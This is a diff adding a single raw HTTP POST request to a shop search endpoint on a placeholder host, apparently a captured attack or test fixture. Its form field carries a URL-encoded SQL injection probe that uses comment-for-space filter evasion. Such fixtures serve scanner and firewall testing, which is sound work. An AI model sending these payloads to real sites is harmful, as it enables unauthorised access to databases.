@@ -1,0 +1,8 @@
+POST /api/search HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Accept: */*
+
+q=admin%27%2F**%2FUNION%2F**%2FSELECT%2F**%2F1%2C2%2C3--
